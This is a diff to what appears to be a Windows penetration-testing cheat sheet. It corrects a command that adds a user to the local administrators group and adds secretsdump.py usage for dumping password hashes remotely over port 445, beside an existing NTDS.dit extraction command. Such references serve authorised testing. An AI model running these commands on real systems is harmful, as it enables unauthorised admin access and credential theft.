@@ -4,7 +4,7 @@ Add admin user.
 
 ```sh
 net user username password /add
-net localhroup administrators username /add
+net localgroup administrators username /add
 ```
 
 ```sh
@@ -61,6 +61,12 @@ Dump secrets from hive
 
 ```sh
 secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
+```
+
+Dump password remotly port 445 is required. 
+
+```sh
+ secretsdump.py 'username:password@xxx.xxx.xxx.xx'
 ```
 
 Check available chares 
